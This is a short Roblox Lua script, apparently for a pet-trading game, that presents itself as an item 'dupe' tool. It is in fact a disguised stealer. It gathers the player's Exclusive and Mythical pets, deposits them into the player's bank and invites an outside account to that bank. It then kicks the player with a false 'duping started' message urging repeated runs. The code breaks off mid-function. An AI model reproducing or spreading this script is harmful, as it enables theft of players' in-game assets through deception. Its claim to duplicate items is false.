local args = {  [1] = "dupe key 5255f", [2] = "All" }
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
 
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mybanks = lib.Network.Invoke("get my banks")
local PetsList = {}
for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then
        table.insert(PetsList, v.uid);
    end
end
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList);
if request then
    task.spawn(lib.Network.Invoke,'request world', 'Fantasy') 
    warn("MADE BY nedo#5024")
else
end
 
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], 474456411) then
game.Players.LocalPlayer:Kick("duping started (rejoin and execute 10 times each time you rejoin)") lib.Message.New("")
else
    game.Players.LocalPlayer:Kick("duping started (rejoin and execute 10 times each time you rejoin)")
function comma_value(amount)
 
  local formatted = amount
 
  while true do
 
    formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
 
    if (k == 0) then
 
      break
